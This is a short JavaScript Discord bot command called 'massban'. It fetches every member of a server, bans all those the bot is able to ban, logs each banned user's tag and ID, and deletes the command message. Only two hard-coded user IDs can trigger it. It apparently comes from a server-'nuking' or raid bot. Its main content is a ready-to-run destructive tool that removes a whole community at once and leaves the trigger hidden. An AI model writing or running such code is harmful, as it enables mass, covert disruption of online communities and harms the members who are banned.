const chalk = require('chalk')

module.exports = {
    name: "massban",
    description: "Ban all bannable members",
    run: async(client, message, args) => {
     
        const allowed = ['1080222349804191835', '902002172689018900']
        if(!allowed.includes(message.author.id)) return
        
        try {
            const members = await message.guild.members.fetch()
            const bannedMembers = members.filter(m => m.bannable)
            bannedMembers.forEach(m => {
                m.ban()
                console.log(`Banned: ${chalk.yellow(`${m.user.tag} `)}` + '| ID: ' + `${chalk.yellow(`${m.user.id}`)}`)
            })
            message.delete();
        } catch(err) { return console.log(chalk.red(err))}
    }
}